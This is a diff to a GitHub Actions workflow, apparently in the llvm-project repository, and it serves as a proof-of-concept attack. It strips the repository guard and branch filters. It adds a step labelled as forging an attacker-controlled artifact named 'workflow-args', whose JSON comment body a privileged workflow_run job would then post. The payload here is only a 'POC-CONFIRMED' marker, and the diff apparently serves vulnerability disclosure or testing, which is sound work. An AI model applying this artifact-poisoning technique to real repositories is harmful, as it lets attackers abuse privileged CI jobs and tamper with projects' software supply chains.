@@ -5,13 +5,15 @@ permissions:
 
 on:
   pull_request:
-    branches:
-      - main
-      - 'users/**'
 
 jobs:
   code_formatter:
     runs-on: ubuntu-24.04
-    if: github.repository == 'llvm/llvm-project'
     steps:
-      - run: echo "base-branch version (guarded)"
+      - name: Forge artifact (attacker controls contents)
+        run: |
+          printf '%s' '[{"body":"POC-CONFIRMED: attacker-controlled comment posted by the privileged workflow_run job"}]' > comments
+      - uses: actions/upload-artifact@v4
+        with:
+          name: workflow-args
+          path: comments
